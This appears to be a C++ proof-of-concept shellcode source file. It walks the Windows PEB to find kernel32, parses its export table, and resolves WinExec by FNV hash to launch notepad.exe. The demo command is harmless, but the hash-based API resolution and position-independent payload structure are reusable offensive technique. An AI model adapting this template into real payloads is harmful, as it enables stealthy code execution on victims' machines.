import utils     ;
import winstructs;
import lbyte.stx ;

using namespace lbyte::stx;
using namespace lbyte::stx::literals;

#define let const auto

extern "C" [[gnu::section(".payload"), gnu::used]]
auto payload() -> void
{
    using WinExecSig = u32(const u8*, u32);

    // -- PEB ---------------------------------------------------------------------------------------
    // Using notepad.exe instead of calc.exe to ensure compatibility with my Wine testing environment.
    let cmd   = "notepad.exe\0"_vstr;
    let peb   = get_peb<win::PEB>();

    // -- Kernel32 via InMemoryOrderModuleList  -----------------------------------------------------
    let ker32 = module_entry<2>( peb )->DllBase;

    // -- PE headers -> Export Directory -----------------------------------------------------------
    let dos   = ker32[0].as_p<win::DOS_HEADER>();

    let nt    = ker32[dos->e_lfanew                                     ].as_p<win::NT_HEADERS64    >();
    let exp   = ker32[nt->OptionalHeader.DataDirectory[0].VirtualAddress].as_p<win::EXPORT_DIRECTORY>();

    let funcs = ker32[exp->AddressOfFunctions   ].as_p<u32>();
    let names = ker32[exp->AddressOfNames       ].as_p<u32>();
    let ords  = ker32[exp->AddressOfNameOrdinals].as_p<u16>();

    // -- Hash walk --------------------------------------------------------------------------------
    for ( let &&idx : range(exp->NumberOfNames) ) {
        let rva  = funcs[ords [idx].read<u16  >()].read<rva_s>();
        let name = ker32[names[idx].read<rva_s>()].as_p<u8   >();

        if ( FnvHash::cstr(name.raw()) == FnvHash::str<"WinExec"> ) {
            null << ker32[rva].call<WinExecSig>(cmd.data(), 5);
            break;
        }
    }
}

